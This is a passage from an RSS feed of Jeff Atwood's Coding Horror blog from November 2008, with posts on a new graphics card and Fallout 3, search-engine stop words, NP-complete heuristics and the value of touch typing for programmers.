This is the perfect time to buy a new video card -- before Thanksgiving and running up to Christmas is prime game release season. All the biggest games hit right about now. Courtesy of my new video card and the <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=fallout%203&amp;tag=codihorr-20&amp;index=videogames&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">outstanding Fallout 3</a>, my productivity last week hit an all-time low. But oh, was it ever worth it. I'm a long time Fallout fan, even to the point that <a href="http://wumpus.homestead.com/">our wedding pre-invites had secret geek Fallout art on them</a>. Yes, that was approved by my wife, because <i>she is awesome</i>.
</p>
<p>
I must say that experiencing the wasteland at 60 frames per second, 1920 x 1200, in <a href="http://www.codinghorror.com/blog/archives/000324.html">high dynamic range lighting</a>, with every single bit of eye candy set to maximum, was <i>so</i> worth it. I dreamt of the wastelands.
</p>
<p>
<a href="http://www.codinghorror.com/blog/images/fallout3-screenshot-large.html"><img alt="image placeholder" >
</p>
<p>
In fact, even after reaching the end of the game, I'm still dreaming of them. I've heard some claim <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=fallout%203&amp;tag=codihorr-20&amp;index=videogames&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">Fallout 3</a> is just Oblivion with guns. To those people, I say this: <i>you say that like it's a bad thing</i>. The game is incredibly true to the Fallout mythos. It's harsh, gritty, almost oppressive in its presentation of the unforgiving post-apocalyptic wasteland -- and yet there's always an undercurrent of dark humor. There are legitimate good and evil paths to every quest, and an entirely open-ended world to discover.
</p>
<p>
No need to take my word for it, though. I later found some <a href="http://www.techspot.com/article/125-fallout3-performance/page4.html">hardware benchmark roundups</a> that confirmed my experience: the GTX 280 is <i>crazy</i> fast in Fallout 3.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Of course, we wouldn't be responsible PC owners if we didn't like to mod our hardware a bit. That's what <a href="http://www.codinghorror.com/blog/archives/000348.html">separates us from those knuckle-dragging Mac users: skill</a>. (I kid, I kid!) First, you'll want to download a copy of the <a href="http://www.techpowerup.com/gpuz/">amazing little GPU-Z application</a>, which will show you in real time what your video card is doing.
</p>
<p>
A little load testing is always a good idea, particularly since I got a bum card with my first order -- it would immediately shoot up to 105 C and throttle within a minute or two of doing anything remotely stressful in 3D. It <i>worked</i>, but the resulting stuttering was intolerable, and the fan noise was unpleasant as the card worked overtime to cool itself down. I'm not sure how I would have figured that out without the real time data and graphs that GPU-Z provides. I returned it for a replacement, and the replacement's behavior is much more sane; compare GPU-Z results at idle (left) and under <a href="http://www.daionet.gr.jp/~masa/rthdribl/">RTHDRIBL</a> load (right):
</p>
<p>
</p>
<table cellpadding="4">
<tr>
<td>
<img alt="image placeholder" >
</td>
<td>
<img alt="image placeholder" >
</td>
</tr>
</table>
<p>
Fortunately, there's not much we need to do to improve things. The Nvidia 8800 and GTX series are equipped with outstanding integrated coolers which directly exhaust the GPU heat from the back of the PC. I'd much rather these high powered GPUs exhaust their heat outward instead of blowing it around inside the PC, so this is the preferred configuration out of the box. However, the default exhaust grille is <i>incredibly</i> restrictive. I cut half of the rear plate away with a dremel, which <b>immediately reduced fan speeds 20% (and thus, noise 20%)</b> due to the improvement in airflow.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Just whip out your trusty dremel (you <i>do</i> own a dremel, right?) and cut along the red line. It's easy. If you're a completionist, you can <a href="http://userwww.sfsu.edu/~douglee/8800GTS/8800GTS.htm">apply better thermal paste to the rest of the card</a> to eke out a few more points of efficiency with the cooler.
</p>
<p>
Extreme? Maybe. But <a href="http://www.codinghorror.com/blog/archives/000665.html">I like my PCs powerful and quiet</a>. That's another thing that attracted me to the GTX 280 -- for a top of the line video card, it's <a href="http://techreport.com/articles.x/14934/16">amazingly efficient at idle</a>. And despite my gaming proclivities, it will be idle 98% of the time.
</p>
<p>
<a href="http://www.anandtech.com/video/showdoc.aspx?i=3341&amp;p=22"><img alt="image placeholder" >
</p>
<p>
I do love this new video card, but I say that every year. I try not to grow too attached. I'm sure this video card will be replaced in a year with something even better.
</p>
<p>
What else would you expect from an addict?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-10T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/feeding-my-graphics-card-addiction/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Stop Me If You Think You've Seen This Word Before ]]></title>
<link>https://blog.codinghorror.com/stop-me-if-you-think-youve-seen-this-word-before/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
If you've ever searched for anything, you've probably run into <a href="http://en.wikipedia.org/wiki/Stop_words">stop words</a>. <strong>Stop words are words so common they are typically ignored for search purposes</strong>. That is, if you type in a stop word as one of your search terms, the search engine will ignore that word (if it can). If you attempt to search using <em>nothing</em> but stop words, the search engine will throw up its hands and tell you to try again.
</p>
<p>
Seems straightforward enough. But there can be issues with stop words. Imagine, for example, you wanted to search for information on this band.
</p>
<p>
<a href="http://www.amazon.com/dp/B0000025Z4/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
"The" is one of the most common words in the English language, so a <a href="http://www.google.com/search?q=the+the">naive search for "The The" rarely ends well</a>.
</p>
<p>
Let's consider some typical English stopword lists.
</p>
<p>
</p>
<table width="560">
<tr>
<td>
<strong>SQL Server stop words</strong>
</td>
<td style="border-left: 1px solid silver; padding-left:10px; padding-right:10px;">
<strong>Oracle stop words</strong>
</td>
</tr>
<tr>
<td>
<table>
<tr>
<td>1</td> <td>before</td> <td>these</td>
<td>	on</td>
<td>	him</td>
</tr>
<tr>
<td>2</td> <td>being</td> <td>they</td>
<td>	only</td>
<td>	himself</td>
</tr>
<tr>
<td>3</td> <td>between</td> <td>this</td>
<td>	or</td>
<td>	his	</td>
</tr>
<tr>
<td>4</td> <td>both</td> <td>those</td>
<td>	other</td>
<td>	how</td>
</tr>
<tr>
<td>5</td> <td>but</td> <td>through</td>
<td>	our</td>
<td>	if</td>
</tr>
<tr>
<td>6</td> <td>by</td> <td>to</td>
<td>out</td>
<td>	in</td>
</tr>
<tr>
<td>7</td> <td>came</td> <td>too</td> <td>	over</td>
<td>	into</td>
</tr>
<tr>
<td>8</td> <td>can</td> <td>under</td> <td>	re</td>
<td>	is</td>
</tr>
<tr>
<td>9</td> <td>come</td> <td>up</td> <td>	said	</td>
<td>	it</td>
</tr>
<tr>
<td>0</td> <td>could</td> <td>use</td> <td>	same</td>
<td>	its</td>
</tr>
<tr>
<td>about</td> <td>did</td> <td>very</td> <td>	see</td>
<td>	just</td>
</tr>
<tr>
<td>after</td>
<td>do</td> <td>want</td> <td>	should</td>
<td>	like</td>
</tr>
<tr>
<td>all</td>
<td>does</td> <td>was</td> <td>	since</td>
<td>	make</td>
</tr>
<tr>
<td>also</td>
<td>each</td> <td>way</td> <td>		so</td>
<td>	many</td>
</tr>
<tr>
<td>an</td>
<td>	else	</td>
<td>we</td>
<td>	some</td>
<td>	me</td>
</tr>
<tr>
<td>and</td>
<td>	for</td>
<td>	well</td>
<td>	still</td>
<td>	might</td>
</tr>
<tr>
<td>another</td>
<td>	from</td>
<td>	were</td>
<td>	such</td>
<td>		more</td>
</tr>
<tr>
<td>any</td>
<td>	get</td>
<td>	what</td>
<td>	take</td>
<td>	most</td>
</tr>
<tr>
<td>are	</td>
<td>got	</td>
<td>when</td>
<td>	than</td>
<td>	much</td>
</tr>
<tr>
<td>as</td>
<td>	has</td>
<td>	where</td>
<td>	that</td>
<td>	must</td>
</tr>
<tr>
<td>at</td>
<td>	had</td>
<td>	which</td>
<td>	<font color="red">the</font>
</td>
<td>	my</td>
</tr>
<tr>
<td>be</td>
<td>	he</td>
<td>	while</td>
<td>	their</td>
<td>	never</td>
</tr>
<tr>
<td>$</td>
<td>	have</td>
<td>	who</td>
<td>	them</td>
<td>	no</td>
</tr>
<tr>
<td>because</td>
<td>	her</td>
<td>	will</td>
<td>	then</td>
<td>	now</td>
</tr>
<tr>
<td>been</td>
<td>	here</td>
<td>	with</td>
<td>	there</td>
<td>	of</td>
</tr>
<tr>
<td>would</td>
<td>you</td>
<td>your</td>
<td> </td>
<td> </td>	</tr>
<tr>
<td colspan="5" nowrap>a b c d e f g h i j k l m n o p q r s t u v w x y z	</td>
</tr>
</table>
</td>
<td style="border-left: 1px solid silver; padding-left:10px; padding-right:10px;" valign="top">
<table>
<tr>
<td>a </td>
<td>he </td>
<td>out </td>
<td>up</td>
</tr>
<tr>
<td>be </td>
<td>more </td>
<td>their </td>
<td>at </td>
</tr>
<tr>
<td>had </td>
<td>one</td>
<td> will</td>
<td> from </td>
</tr>
<tr>
<td>it </td>
<td>than </td>
<td>and </td>
<td>is </td>
</tr>
<tr>
<td>only </td>
<td>when </td>
<td>corp </td>
<td>not </td>
</tr>
<tr>
<td>she </td>
<td>also </td>
<td>in</td>
<td> says</td>
</tr>
<tr>
<td>was </td>
<td>by </td>
<td>ms </td>
<td>to</td>
</tr>
<tr>
<td>about </td>
<td>her</td>
<td> over </td>
<td> </td>
</tr>
<tr>
<td>because</td>
<td> most</td>
<td> there </td>
<td> </td>
</tr>
<tr>
<td>has </td>
<td>or</td>
<td> with </td>
<td> </td>
</tr>
<tr>
<td>its </td>
<td>that </td>
<td>are </td>
<td> </td>
</tr>
<tr>
<td>of </td>
<td>which </td>
<td>could </td>
<td> </td>
</tr>
<tr>
<td>some </td>
<td>an </td>
<td>inc </td>
<td> </td>
</tr>
<tr>
<td>we </td>
<td>can </td>
<td>mz</td>
<td> </td>
</tr>
<tr>
<td>after</td>
<td> his </td>
<td>s </td>
<td> </td>
</tr>
<tr>
<td>been </td>
<td>mr </td>
<td>they</td>
<td> </td>
</tr>
<tr>
<td>have </td>
<td>other</td>
<td> would</td>
<td> </td>
</tr>
<tr>
<td>last </td>
<td><font color="red">the</font></td>
<td>as</td>
<td> </td>
</tr>
<tr>
<td>on </td>
<td>who </td>
<td>for</td>
<td> </td>
</tr>
<tr>
<td>such </td>
<td>any </td>
<td>into </td>
<td> </td>
</tr>
<tr>
<td>were </td>
<td>co</td>
<td> no </td>
<td> </td>
</tr>
<tr>
<td>all </td>
<td>if </td>
<td>so</td>
<td> </td>
</tr>
<tr>
<td>but </td>
<td>mrs </td>
<td>this </td>
<td> </td>
</tr>
</table>
</td>
</tr>
</table>
<p>
You'd think a pure count of frequency, how often the word occurs, would be enough to make a common group of words "stop words", but apparently not everyone agrees. The default SQL Server stop word list is much larger than the Oracle stop word list. What makes <strong>"many"</strong> a stop word to Microsoft, but not to Oracle? Who knows. And I'm not even going to show the <a href="http://dev.mysql.com/doc/refman/5.0/en/fulltext-stopwords.html">MySQL full text search stop word list</a> here, because it's <em>enormous</em>, easily double the size of the SQL Server stop word list.
</p>
<p>
These are just the default stop word lists; that doesn't mean you're stuck with them. You can edit the stop word list for any of these databases. Depending on what you're searching, you might decide to have different stop words entirely, or maybe no stop words at all.
</p>
<p>
Way back in 2004, I ran a little experiment with Google -- over a period of a week, <strong>I searched for an entire dictionary of ~110k individual English words and recorded how many hits Google returned for each</strong>.
</p>
<p>
Yes, this is probably a massive violation of the Google terms of service, but I tried to keep it polite and low impact -- I used Gzip compressed HTTP requests, specified only 10 search results should be returned per query (as all I needed was the count of hits), and I added a healthy delay between queries so I wasn't querying too rapidly. I'm not sure this kind of experiment would fly against today's Google, but it worked in 2004. At any rate, I <strong>ended up with a MySQL database of 110,000 English words and their frequency in Google as of late summer 2004</strong>. Here are the top results:
</p>
<table width="760">
<tr>
<td style="vertical-align:top">
<table cellpadding="2" cellspacing="2">
<tr>
<td>the</td>
<td align="right">522,000,000</td>
</tr>
<tr>
<td>of</td>
<td align="right">515,000,000</td>
</tr>
<tr>
<td>and</td>
<td align="right">508,000,000</td>
</tr>
<tr>
<td>to</td>
<td align="right">507,000,000</td>
</tr>
<tr>
<td>in</td>
<td align="right">479,000,000</td>
</tr>
<tr>
<td>for</td>
<td align="right">468,000,000</td>
</tr>
<tr>
<td>internet</td>
<td align="right">429,000,000</td>
</tr>
<tr>
<td>on</td>
<td align="right">401,000,000</td>
</tr>
<tr>
<td>home</td>
<td align="right">370,000,000</td>
</tr>
<tr>
<td>is</td>
<td align="right">368,000,000</td>
</tr>
<tr>
<td>by</td>
<td align="right">366,000,000</td>
</tr>
<tr>
<td>all</td>
<td align="right">352,000,000</td>
</tr>
<tr>
<td>this</td>
<td align="right">341,000,000</td>
</tr>
<tr>
<td>with</td>
<td align="right">338,000,000</td>
</tr>
<tr>
<td>services</td>
<td align="right">329,000,000</td>
</tr>
<tr>
<td>about</td>
<td align="right">319,000,000</td>
</tr>
<tr>
<td>or</td>
<td align="right">317,000,000</td>
</tr>
<tr>
<td>at</td>
<td align="right">316,000,000</td>
</tr>
</table>
</td>
<td style="padding-left:10px; vertical-align:top">
<table cellpadding="2" cellspacing="2">
<tr>
<td>email</td>
<td align="right">311,000,000</td>
</tr>
<tr>
<td>from</td>
<td align="right">308,000,000</td>
</tr>
<tr>
<td>are</td>
<td align="right">306,000,000</td>
</tr>
<tr>
<td>website</td>
<td align="right">302,000,000</td>
</tr>
<tr>
<td>us</td>
<td align="right">301,000,000</td>
</tr>
<tr>
<td>site</td>
<td align="right">283,000,000</td>
</tr>
<tr>
<td>sites</td>
<td align="right">279,000,000</td>
</tr>
<tr>
<td>you</td>
<td align="right">276,000,000</td>
</tr>
<tr>
<td>information</td>
<td align="right">276,000,000</td>
</tr>
<tr>
<td>contact</td>
<td align="right">274,000,000</td>
</tr>
<tr>
<td>more</td>
<td align="right">271,000,000</td>
</tr>
<tr>
<td>an</td>
<td align="right">271,000,000</td>
</tr>
<tr>
<td>search</td>
<td align="right">269,000,000</td>
</tr>
<tr>
<td>new</td>
<td align="right">269,000,000</td>
</tr>
<tr>
<td>that</td>
<td align="right">267,000,000</td>
</tr>
<tr>
<td>your</td>
<td align="right">262,000,000</td>
</tr>
<tr>
<td>it</td>
<td align="right">261,000,000</td>
</tr>
<tr>
<td>be</td>
<td align="right">258,000,000</td>
</tr>
</table>
</td>
<td style="padding-left:10px; vertical-align:top">
<table cellpadding="2" cellspacing="2">
<tr>
<td>prices</td>
<td align="right">258,000,000</td>
</tr>
<tr>
<td>as</td>
<td align="right">255,000,000</td>
</tr>
<tr>
<td>page</td>
<td align="right">246,000,000</td>
</tr>
<tr>
<td>hotels</td>
<td align="right">240,000,000</td>
</tr>
<tr>
<td>products</td>
<td align="right">234,000,000</td>
</tr>
<tr>
<td>other</td>
<td align="right">222,000,000</td>
</tr>
<tr>
<td>have</td>
<td align="right">219,000,000</td>
</tr>
<tr>
<td>web</td>
<td align="right">219,000,000</td>
</tr>
<tr>
<td>copyright</td>
<td align="right">218,000,000</td>
</tr>
<tr>
<td>download</td>
<td align="right">218,000,000</td>
</tr>
<tr>
<td>not</td>
<td align="right">214,000,000</td>
</tr>
<tr>
<td>can</td>
<td align="right">209,000,000</td>
</tr>
<tr>
<td>reviews</td>
<td align="right">209,000,000</td>
</tr>
<tr>
<td>our</td>
<td align="right">206,000,000</td>
</tr>
<tr>
<td>use</td>
<td align="right">205,000,000</td>
</tr>
<tr>
<td>women</td>
<td align="right">200,000,000</td>
</tr>
</table>
</td>
</tr>
</table>
<p>
Again, a very different list than what we saw from SQL Server or Oracle. I'm not sure why the results are so strikingly different. Also, the web (or at least Google's index of the web) is much bigger now than it was in 2004; <a href="http://www.google.com/search?q=the">a search for "the"</a> returns 13.4 <em>billion</em> results -- that's 25 times larger than my 2004 result of 522 million.
</p>
<p>
On Stack Overflow, <strong>we warn users via an AJAX callback when they enter a title composed entirely of stop words</strong>. It's hard to imagine a good title consisting solely of stopwords, but maybe that's just because our technology stack isn't sufficiently advanced yet.
</p>
<p>
Google doesn't seem to use stop words any more, as you can see from <a href="http://www.google.com/search?q=to+be+or+not+to+be">this search for "to be or not to be"</a>.
</p>
<p>
<a href="http://www.google.com/search?q=to+be+or+not+to+be"><img alt="image placeholder" >
</p>
<p>
<strong>Indeed, I wonder if classic search stop words are relevant in modern computing</strong>; perhaps they're a relic of early 90's computing that we haven't quite left behind yet. We have server farms and computers perfectly capable of handling the extremely large result sets from querying common English words. A <a href="http://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO2&amp;Sect2=HITOFF&amp;u=%2Fnetahtml%2FPTO%2Fsearch-adv.htm&amp;r=1&amp;p=1&amp;f=G&amp;l=50&amp;d=PTXT&amp;S1=7,409,383.PN.&amp;OS=pn/7,409,383&amp;RS=PN/7,409,383">Google patent</a> filed in 2004 and granted in 2008 seems to <a href="http://www.seobythesea.com/?p=1109">argue against the use of stop words</a>.
</p>
<p>
</p>
<blockquote>
Sometimes words and phrases that might be considered stopwords or stop-phrases may actually be meaningful or important. For example, the word "the" in the phrase "the matrix" could be considered a stopword, but someone searching for the term may be looking for information about the movie "The Matrix" instead of trying to find information about mathematical information contained in a table of rows and columns (a matrix).
<p>
A search for "show me the money" might be looking for a movie where the phrase was an important line, repeated a few times in the movie. Or a search for "show me the way" might be a request to find songs using that phrase as a title from Peter Frampton or from the band Styx.
</p>
<p>
A <a href="http://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO2&amp;Sect2=HITOFF&amp;u=%2Fnetahtml%2FPTO%2Fsearch-adv.htm&amp;r=1&amp;p=1&amp;f=G&amp;l=50&amp;d=PTXT&amp;S1=7,409,383.PN.&amp;OS=pn/7,409,383&amp;RS=PN/7,409,383">Google patent</a> granted this week explores how a search engine might look at queries that contain stopwords or stop-phrases, and determine whether or not the stopword or stop-phrase is meaningful enough to include in search results shown to a searcher.
</p>
<p></p>
</blockquote>
<p>
Apparently, at least to Google, stop word warnings are a thing of the past.
</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-12T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/stop-me-if-you-think-youve-seen-this-word-before/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Your Favorite NP-Complete Cheat ]]></title>
<link>https://blog.codinghorror.com/your-favorite-np-complete-cheat/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Have you ever heard a software engineer refer to a problem as "NP-complete"? That's fancy computer science jargon <a href="http://en.wikipedia.org/wiki/NP-complete">shorthand for "incredibly hard"</a>:
</p>
<p>
</p>
<blockquote>
The most notable characteristic of NP-complete problems is that no fast solution to them is known; that is, the time required to solve the problem using any currently known algorithm increases very quickly as the size of the problem grows. As a result, <b>the time required to solve even moderately large versions of many of these problems easily reaches into the billions or trillions of years</b>, using any amount of computing power available today. As a consequence, determining whether or not it is possible to solve these problems quickly is one of the principal unsolved problems in Computer Science today.
<p>
While a method for computing the solutions to NP-complete problems using a reasonable amount of time remains undiscovered, computer scientists and programmers still frequently encounter NP-complete problems. An expert programmer should be able to recognize an NP-complete problem so that he or she does not unknowingly waste time trying to solve a problem which so far has eluded generations of computer scientists.
</p>
</blockquote>
<p>
You do want to be an <i>expert</i> programmer, don't you? Of course you do!
</p>
<p>
<s>NP-complete problems are like hardcore pornography. Nobody can define what makes a problem NP-complete, exactly, but <a href="http://en.wikipedia.org/wiki/I_know_it_when_I_see_it">you'll know it when you see it</a>. Just this once, I'll refrain from my usual practice of inserting images to illustrate my point.</s>
</p>
<p>
(<font color="red">Update:</font> I was shooting for a poetic allusion to the <a href="http://en.wikipedia.org/wiki/Complexity_classes_P_and_NP">P=NP problem</a> here but based on the comments this is confusing and arguably incorrect. So I'll redact this sentence. Instead, I point you to <a href="http://www.cs.umd.edu/~gasarch/papers/poll.pdf">this P=NP poll</a> (pdf); read the comments from CS professors (including Knuth) to get an idea of how realistic this might be.)
</p>
<p>
Instead, I'll recommend a book Anthony Scian recommended to me: <a href="http://www.amazon.com/dp/0716710455/?tag=codihorr-20">Computers and Intractability: A Guide to the Theory of NP-Completeness</a>.
</p>
<p>
<a href="http://www.amazon.com/dp/0716710455/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
Like all the software engineering books I recommend, this book has a timeless quality. It was originally published in 1979, a shining testament to smart people attacking truly difficult problems in computer science: <a href="http://max.cs.kzoo.edu/~kschultz/CS510/ClassPresentations/NPCartoons.html">"I can't find an efficient algorithm, but neither can all these famous people."</a>
</p>
<p>
So how many problems are NP-complete? <a href="http://en.wikipedia.org/wiki/List_of_NP-complete_problems">Lots</a>.
</p>
<p>
Even if you're a layman, you might have experienced NP-Completeness <a href="http://www.codinghorror.com/blog/archives/000936.html">in the form of Minesweeper</a>, as <a href="http://www.claymath.org/Popular_Lectures/Minesweeper/">Ian Stewart explains</a>. But for programmers, I'd argue the most well known NP-completeness problem is the <a href="http://en.wikipedia.org/wiki/Travelling_salesman_problem">travelling salesman problem</a>.
</p>
<p>
</p>
<blockquote>
Given a number of cities and the costs of travelling from any city to any other city, what is the least-cost round-trip route that visits each city exactly once and then returns to the starting city?
</blockquote>
<p>
The <a href="http://www.codinghorror.com/blog/archives/000986.html">brute-force solution</a> -- trying every possible permutation between the cities -- might work for a very small network of cities, but this quickly becomes untenable. Even if we were to use theoretical CPUs our children might own, or our children's children. What's worse, every other algorithm we come up with to find an optimal path for the salesman has the same problem. That's the common characteristic of NP-complete problems: they are <b>exercises in heuristics and approximation</b>, as illustrated by <a href="http://xkcd.com/399/">this xkcd cartoon</a>:
</p>
<p>
<a href="http://xkcd.com/399/"><img alt="image placeholder" >
</p>
<p>
What do <i>expert</i> programmers do when faced by an intractable problem? <b>They cheat</b>. And so should you! Indeed, some of the <a href="http://en.wikipedia.org/wiki/Travelling_salesman_problem#Heuristics">modern approximations</a> for the Travelling Salesman Problem are <i>remarkably</i> effective.
</p>
<p>
</p>
<blockquote>
Various approximation algorithms, which quickly yield good solutions with high probability, have been devised. Modern methods can find solutions for extremely large problems (millions of cities) within a reasonable time, with a high probability of being just 2-3% away from the optimal solution.
</blockquote>
<p>
Unfortunately, not all NP-complete problems have good approximations. But for those that do, I have to wonder: if we can get so close to an optimal solution by cheating, does it really matter if there's no known algorithm to produce <i>the</i> optimal solution? If I've learned nothing else from NP-complete problems, I've learned this: <b>sometimes coming up with clever cheats can be more interesting than searching in vain for the perfect solution</b>.
</p>
<p>
Consider the <a href="http://en.wikipedia.org/wiki/Bin_packing_problem#Analysis_of_heuristic_algorithms">First Fit Decreasing</a> algorithm for the NP-complete <a href="http://www.ams.org/featurecolumn/archive/bins1.html">Bin Packing problem</a> . It's not perfect, but it's incredibly simple and fast. The algorithm is so simple, in fact, it is <a href="http://www.synergyinstituteonline.com/detail_article.php?artid=319">regularly demonstrated at time management seminars</a>. Oh, <i>and</i> it guarantees that you will get within 22% of the perfect solution every time. Not bad for a lousy cheat.
</p>
<p>
So what's <i>your</i> favorite NP-complete cheat?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-15T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/your-favorite-np-complete-cheat/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ We Are Typists First, Programmers Second ]]></title>
<link>https://blog.codinghorror.com/we-are-typists-first-programmers-second/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Remember last week when I said <a href="http://www.codinghorror.com/blog/archives/001184.html">coding was just writing?</a></p>
<p>I was wrong. As one commenter noted, it's even simpler than that.</p>
<blockquote><p>[This] reminds me of a true "Dilbert moment" a few years ago, when my (obviously non-technical) boss commented that he never understood why it took months to develop software. "After all", he said, "it's just typing."</p></blockquote>
<p>Like broken clocks, even pointy-haired managers are right once a day. <strong>Coding is just typing.</strong></p>
<p><img alt="image placeholder" >
<p>So if you want to become a great programmer, start by becoming a great typist. <a href="http://steve-yegge.blogspot.com/2008/09/programmings-dirtiest-little-secret.html">Just ask Steve Yegge</a>.</p>
<blockquote>
<p>I can't understand why professional programmers out there allow themselves to have a career without teaching themselves to type. It doesn't make any sense. It's like being, I dunno, an actor without knowing how to put your clothes on. It's showing up to the game unprepared. It's coming to a meeting without your slides. Going to class without your homework. Swimming in the Olympics wearing a pair of Eddie Bauer Adventurer Shorts.</p>
<p>Let's face it: it's <em>lazy</em>.</p>
<p>There's just no excuse for it. There are no excuses. I have a friend, John, who can only use one of his hands. He types 70 wpm. He invented his own technique for it. He's not making excuses; he's typing circles around people who are making excuses.</p>
</blockquote>
<p>I had a brief email exchange with Steve back in March 2007, after I wrote <a href="http://www.codinghorror.com/blog/2007/03/going-commando---put-down-the-mouse.html">Put Down The Mouse</a>, where he laid that very same <a href="http://www.imdb.com/title/tt0105236/quotes?qt=qt0349153">Reservoir Dogs quote</a> on me. Steve's <a href="http://steve-yegge.blogspot.com/2008/09/programmings-dirtiest-little-secret.html">followup blog post</a> was a very long time in coming. I hope Steve doesn't mind, but I'd like to pull two choice quotes directly from his email responses:</p>
<blockquote>
<p>I was trying to figure out which is the most important computer science course a CS student could ever take, and eventually realized it's Typing 101.</p>
<p>The really great engineers I know, the ones who build great things, they can type.</p>
</blockquote>
<p>Strong statements indeed. I concur. <strong>We are typists first, and programmers second.</strong> It's very difficult for me to take another programmer seriously when I see them using the <a href="http://en.wikipedia.org/wiki/Typing#Hunt_and_peck">hunt and peck typing techniques</a>. Like Steve, I've seen this far too often.</p>
<p>First, a bit of honesty is in order. Unlike Steve, I am a completely self-taught typist. I didn't take any typing classes in high school. Before I wrote this blog post, I realized I should check to make sure I'm not a total hypocrite. So I went to <a href="http://www.typeonline.co.uk/typingspeed.php">the first search result for typing test</a> and gave it a shot.</p>
<p><a href="http://www.typeonline.co.uk/typingspeed.php"><img alt="image placeholder" >
<p>I am by no means the world's fastest typist, though <a href="http://www.codinghorror.com/blog/archives/000372.html">I do play a mean game of Typing of the Dead</a>. Let me emphasize that <em>this isn't a typing contest</em>. I just wanted to make sure I wasn't full of crap before I posted this. Yes, there's a first time for everything. Maybe this'll be the start of a trend. Doubtful, but you never know.</p>
<p>Steve and I believe there is nothing more fundamental in programming than the ability to efficiently express yourself through typing. Note that I said "efficiently" not "perfectly". This is about <strong>reasonable competency at a core programming discipline</strong>.</p>
<p>Maybe you're not convinced that typing is a core programming discipline. I don't blame you, although I do reserve the right to wonder how you manage to program without using your keyboard.</p>
<p>Instead of answering directly, let me share one of my (many) personal foibles with you. At least four times a day, I walk into a room having <em>no idea</em> why I entered that room. I mean no idea whatsoever. It's as if I have somehow been teleported into that room by an alien civilization. Sadly, the truth is much less thrilling. Here's what happened: in the brief time it took for me to get up and move from point A to point B, I have totally forgetten whatever it was that motivated me to get up at all. Oh sure, I'll rack my brain for a bit, trying to remember what I needed to do in that room. Sometimes I remember, sometimes I don't. In the end, I usually end up making multiple trips back and forth, remembering something else I <em>should</em> have done while I was in that room after I've already left it.</p>
<p>It's all quite sad. Hopefully your brain has a more efficient task stack than mine. But I don't fault my brain – I fault my body. It can't keep up. If I had arrived faster, I wouldn't have had time to forget.</p>
<p>What I'm trying to say is this: <em>speed matters</em>. <strong>When you're a fast, efficient typist, you spend less time between thinking that thought and expressing it in code.</strong> Which means, if you're me at least, that you might actually get <em>some</em> of your ideas committed to screen before you completely lose your train of thought. Again.</p>
<p>Yes, you should think about what you're doing, obviously. Don't just type random gibberish as fast as you can on the screen, unless you're a Perl programmer. But all other things being equal – and they never are – the touch typist <em>will</em> have an advantage. The best way to become a touch typist is through typing, and lots of it. A little research and structured practice couldn't hurt either. Here are some links that might be of interest to the aspiring touch typist:</p>
<ul>
<li>
<a href="http://play.typeracer.com/">Type Racer</a> </li>
<li>
<a href="http://www.popcap.com/games/free/typershark">Typer Shark</a> </li>
<li>
<a href="http://haacked.com/archive/2007/06/05/dvorak-keyboard-layout-of-champions.aspx">Dvorak, Keyboard Layout of Champions</a> </li>
<li>
<a href="http://colemak.com/">Colemak keyboard layout</a> </li>
<li>
<a href="http://typera.tk/">TyperA</a> </li>
<li>
<a href="http://www.daskeyboard.com/">Das Keyboard</a> with blank keys </li>
<li>
<a href="http://en.wikipedia.org/wiki/The_Typing_of_the_Dead">The Typing of the Dead</a> (for PC) </li>
<li>
<a href="http://www.codinghorror.com/blog/2007/03/going-commando---put-down-the-mouse.html">Put Down That Mouse</a>. Seriously. It's a crutch. </li>
<li>
<a href="http://www.sightseekerstudio.com/yanmani/typingmania4.html">Typingmania</a> (warning, Japanophiles only) </li>
</ul>
<p>(But this is a meager and incomplete list. What tools do <em>you</em> recommend for becoming a better typist?)</p>
<p>There's precious little a programmer can do without touching the keyboard; it is the primary tool of our trade. I believe in <a href="http://www.codinghorror.com/blog/archives/000954.html">practicing the fundamentals</a>, and <strong>typing skills are as fundamental as it gets for programmers.</strong></p>
<p>Hail to the typists!</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-17T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/we-are-typists-first-programmers-second/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ That's Not a Bug, It's a Feature Request ]]></title>
<link>https://blog.codinghorror.com/thats-not-a-bug-its-a-feature-request/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
For as long as I've been a software developer and used bug tracking systems, we have struggled with the same fundamental problem in every single project we've worked on: <b>how do you tell bugs from feature requests?</b>
</p>
<p>
Sure, there are some obvious crashes that are clearly bugs. But that's maybe 10% of what you deal with on a daily basis, and the real killer showstopper bugs -- the ones that prevent normal usage of the system -- are eradicated quickly, lest the entire project fail. The rest of the entries in your bug tracking system, the vast majority, exist in an uncertain gray no-man's land. Did users report a bug? Not quite. Are users asking for a new or enhanced feature? Not quite. Well, which is it?
</p>
<p>
